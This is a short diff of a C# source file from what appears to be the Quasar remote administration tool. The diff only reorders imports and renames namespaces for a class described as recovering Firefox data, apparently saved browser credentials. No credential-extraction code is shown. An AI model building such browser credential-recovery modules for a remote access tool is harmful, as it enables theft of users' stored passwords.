@@ -1,18 +1,18 @@
-﻿using Microsoft.Win32;
-using Quasar.Common.Models;
-using System;
+﻿using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Diagnostics;
 using System.IO;
 using System.Runtime.InteropServices;
 using System.Text;
-using xClient.Core.Extensions;
-using xClient.Core.Helper;
-using xClient.Core.Recovery.Utilities;
-using xClient.Core.Utilities;
+using Microsoft.Win32;
+using Quasar.Client.Core.Extensions;
+using Quasar.Client.Core.Helper;
+using Quasar.Client.Core.Recovery.Utilities;
+using Quasar.Client.Core.Utilities;
+using Quasar.Common.Models;
 
-namespace xClient.Core.Recovery.Browsers
+namespace Quasar.Client.Core.Recovery.Browsers
 {
     /// <summary>
     /// A small class to recover Firefox Data
